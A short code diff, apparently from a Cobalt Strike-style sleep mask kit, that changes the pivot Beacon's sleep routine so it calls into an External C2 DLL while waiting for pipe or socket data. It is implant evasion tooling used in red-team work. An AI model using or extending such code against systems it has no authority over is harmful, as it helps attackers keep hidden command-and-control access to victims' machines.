@@ -9,9 +9,10 @@
 /**
 * SMB/TCP Beacon sleep
 *
-* @param sleepmaskInfo A pointer to the SLEEPMASK_INFO structure
+* @param info A pointer to the SLEEPMASK_INFO structure
+* @param customUserData A pointer to a CUSTOM_USER_DATA structure 
 */
-void PivotSleep(PSLEEPMASK_INFO info) {
+void PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
 #ifndef _DEBUG
     DFR_LOCAL(WS2_32, accept);
     DFR_LOCAL(WS2_32, recv);
@@ -25,6 +26,9 @@ void PivotSleep(PSLEEPMASK_INFO info) {
     // Create new variables for readability
     PIVOT_ACTION action = info->pivot_args.action;
     PIVOT_ARGS pivotArguments = info->pivot_args;
+
+    // Check whether the Beacon is an extc2-loader Beacon
+    EXTC2_DLL_STATE externalC2Dll = GetExternalC2DllState(info, customUserData);
 
     if (action == ACTION_TCP_ACCEPT) {
         // Accept a socket
@@ -68,8 +72,17 @@ void PivotSleep(PSLEEPMASK_INFO info) {
                 if (dataAvailable > 0) {
                     break;
                 }
+                
+                if (externalC2Dll == EXTC2_DLL_INITIALIZED) {
+                    DLOGF("SLEEPMASK: Calling External C2 Sleep\n");
+                    ExternalC2Sleep(info, customUserData);
+                }
 
-                // Add a small Sleep between checking the pipe for data
+                /**
+                * A small Sleep before checking the pipe for data.
+                * This also give the External C2 client time to process 
+                * any requests after waking up.
+                */
                 Sleep(500);
             }
         }
